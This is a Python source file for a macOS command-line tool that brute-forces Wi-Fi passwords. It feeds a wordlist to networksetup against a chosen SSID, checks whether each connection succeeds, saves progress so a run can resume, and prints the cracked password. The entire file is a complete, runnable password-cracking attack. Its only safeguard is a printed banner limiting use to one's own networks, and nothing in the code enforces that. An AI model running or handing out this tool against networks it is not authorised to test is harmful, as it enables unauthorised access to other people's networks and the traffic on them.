import subprocess
import sys
import time
import os
import argparse
import json
import atexit

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

def print_colored(message, color=Colors.WHITE):
    """彩色打印函数"""
    print(f"{color}{message}{Colors.RESET}")

def get_progress_file_path(ssid):
    """生成基于SSID的进度文件路径"""
    import hashlib
    hash_object = hashlib.md5(ssid.encode())
    return f"wifi_progress_{hash_object.hexdigest()[:10]}.json"

def load_progress(progress_file):
    """从进度文件加载进度"""
    if os.path.exists(progress_file):
        try:
            with open(progress_file, 'r') as f:
                progress = json.load(f)
                print_colored(f"Progress file found, {len(progress['attempted_passwords'])} passwords already attempted", Colors.CYAN)
                return progress
        except Exception as e:
            print_colored(f"Failed to read progress file: {e}", Colors.YELLOW)
    
    # 如果没有进度文件或读取失败，返回空进度
    return {
        'attempted_passwords': [],
        'ssid': ''
    }

def save_progress(progress_file, attempted_passwords, ssid):
    """保存进度到文件"""
    try:
        progress_data = {
            'attempted_passwords': attempted_passwords,
            'ssid': ssid,
            'timestamp': time.time()
        }
        
        with open(progress_file, 'w') as f:
            json.dump(progress_data, f)
    except Exception as e:
        print_colored(f"Failed to save progress: {e}", Colors.YELLOW)

def cleanup_progress(progress_file):
    """清理进度文件"""
    if os.path.exists(progress_file):
        try:
            os.remove(progress_file)
            print_colored("Progress file cleaned up", Colors.CYAN)
        except Exception as e:
            print_colored(f"Failed to clean up progress file: {e}", Colors.YELLOW)

def test_wifi_password(ssid, password):
    """测试单个WiFi密码"""
    try:
        # Remove known network first (avoid interference from previous connections)
        subprocess.run(['networksetup', '-removepreferredwirelessnetwork', 'en0', ssid], 
                      capture_output=True, text=True)
        
        # Attempt to connect to network
        result = subprocess.run(['networksetup', '-setairportnetwork', 'en0', ssid, password],
                              capture_output=True, text=True, timeout=15)
        
        # Wait for connection to stabilize
        time.sleep(5)
        
        # Check connection status
        check_result = subprocess.run(['networksetup', '-getinfo', 'Wi-Fi'],
                                    capture_output=True, text=True)
        if "Subnet mask" in check_result.stdout:
            return True
        else:
            return False
            
    except subprocess.TimeoutExpired:
        return False
    except Exception as e:
        print_colored(f"Error during connection: {e}", Colors.YELLOW)
        return False

def brute_force_wifi(txt_file_path, ssid, resume=True):
    """暴力破解WiFi密码"""
    
    # Check if file exists
    if not os.path.exists(txt_file_path):
        print_colored(f"Error: File '{txt_file_path}' does not exist!", Colors.RED)
        return False
    
    # Check if we have sufficient permissions
    try:
        subprocess.run(['networksetup', '-listallnetworkservices'], 
                      capture_output=True, check=True)
    except:
        print_colored("Error: Administrator privileges required!", Colors.RED)
        print_colored("Please run: sudo python3 macos_brute_force.py", Colors.RED)
        return False
    
    # Get progress file path (based on SSID)
    progress_file = get_progress_file_path(ssid)
    
    # Register cleanup function on exit
    if resume:
        atexit.register(lambda: print_colored("\nProgress automatically saved, will resume from current position next time", Colors.CYAN))
    
    # Load progress
    progress = load_progress(progress_file) if resume else {
        'attempted_passwords': [],
        'ssid': ssid
    }
    
    print_colored(f"Starting WiFi test: {ssid}", Colors.CYAN)
    print_colored(f"Using password file: {txt_file_path}", Colors.CYAN)
    print_colored("=" * 50, Colors.CYAN)
    
    try:
        with open(txt_file_path, 'r', encoding='utf-8') as file:
            all_passwords = [line.strip() for line in file if line.strip()]
        
        # Filter out already attempted passwords
        attempted_passwords = set(progress.get('attempted_passwords', []))
        new_passwords = [p for p in all_passwords if p not in attempted_passwords]
        
        total_passwords = len(all_passwords)
        skipped_passwords = len(all_passwords) - len(new_passwords)
        remaining_passwords = len(new_passwords)
        
        print_colored(f"Password file contains {total_passwords} passwords", Colors.BLUE)
        print_colored(f"Skipped {skipped_passwords} previously attempted passwords", Colors.BLUE)
        print_colored(f"Remaining {remaining_passwords} new passwords to try", Colors.BLUE)
        
        if remaining_passwords == 0:
            print_colored("No new passwords to attempt", Colors.YELLOW)
            return False
        
        for index, password in enumerate(new_passwords, 1):
            if len(password) < 8:
                continue
            
            print_colored(f"Trying password {index}/{remaining_passwords}: {password}", Colors.YELLOW)
            
            if test_wifi_password(ssid, password):
                print_colored("=" * 50, Colors.GREEN)
                print_colored(f"✅ Password cracked successfully!", Colors.GREEN)
                print_colored(f"📶 WiFi: {ssid}", Colors.GREEN)
                print_colored(f"🔑 Password: {password}", Colors.GREEN)
                print_colored("=" * 50, Colors.GREEN)
                
                # Clean up progress file on success
                # cleanup_progress(progress_file)
                return True
            else:
                print_colored(f"❌ Wrong password: {password}", Colors.RED)
            
            # Update progress - add this password to attempted list
            attempted_passwords.add(password)
            if resume:
                save_progress(progress_file, list(attempted_passwords), ssid)
            
            # Add delay to avoid frequent attempts
            time.sleep(2)
        
        print_colored("All new passwords attempted, correct password not found", Colors.RED)
        
        # Clean up progress file after all attempts
        cleanup_progress(progress_file)
        return False
        
    except FileNotFoundError:
        print_colored(f"Error: Cannot find file '{txt_file_path}'", Colors.RED)
        return False
    except Exception as e:
        print_colored(f"Error occurred: {e}", Colors.RED)
        return False

def show_progress(ssid):
    """显示当前SSID的尝试进度"""
    progress_file = get_progress_file_path(ssid)
    if os.path.exists(progress_file):
        progress = load_progress(progress_file)
        print_colored(f"SSID: {ssid}", Colors.CYAN)
        print_colored(f"Number of attempted passwords: {len(progress['attempted_passwords'])}", Colors.CYAN)
        print_colored("Last 10 attempted passwords:", Colors.CYAN)
        for pwd in progress['attempted_passwords'][-10:]:
            print(f"  - {pwd}")
    else:
        print_colored(f"No progress file found for SSID '{ssid}'", Colors.YELLOW)

def clear_progress(ssid):
    """清除指定SSID的进度"""
    progress_file = get_progress_file_path(ssid)
    cleanup_progress(progress_file)
    print_colored(f"Progress cleared for SSID '{ssid}'", Colors.GREEN)

def main():
    """主函数"""
    parser = argparse.ArgumentParser(description='macOS WiFi Password Testing Tool')
    parser.add_argument('-f', '--file', help='Password file path (one password per line)')
    parser.add_argument('-s', '--ssid', help='Target WiFi SSID')
    parser.add_argument('--no-resume', action='store_true', help='Do not resume from last progress, start over')
    parser.add_argument('--show-progress', action='store_true', help='Show attempt progress for specified SSID')
    parser.add_argument('--clear-progress', action='store_true', help='Clear progress for specified SSID')
    
    args = parser.parse_args()
    
    print_colored("macOS WiFi Password Testing Tool", Colors.CYAN + Colors.BOLD)
    print_colored("For testing your own networks only!", Colors.YELLOW)
    print()
    
    # Handle show progress request
    if args.show_progress:
        if not args.ssid:
            print_colored("Error: Showing progress requires specifying SSID", Colors.RED)
            return
        show_progress(args.ssid)
        return
    
    # Handle clear progress request
    if args.clear_progress:
        if not args.ssid:
            print_colored("Error: Clearing progress requires specifying SSID", Colors.RED)
            return
        clear_progress(args.ssid)
        return
    
    # Normal testing mode
    if not args.file or not args.ssid:
        print_colored("Error: Normal testing mode requires specifying file path and SSID", Colors.RED)
        parser.print_help()
        return
    
    # Check if we should resume progress
    resume = not args.no_resume
    
    if not resume:
        print_colored("Starting from beginning, ignoring previous progress", Colors.YELLOW)
        # Clean up any existing progress file
        progress_file = get_progress_file_path(args.ssid)
        cleanup_progress(progress_file)
    
    brute_force_wifi(args.file, args.ssid, resume)

if __name__ == "__main__":
    main()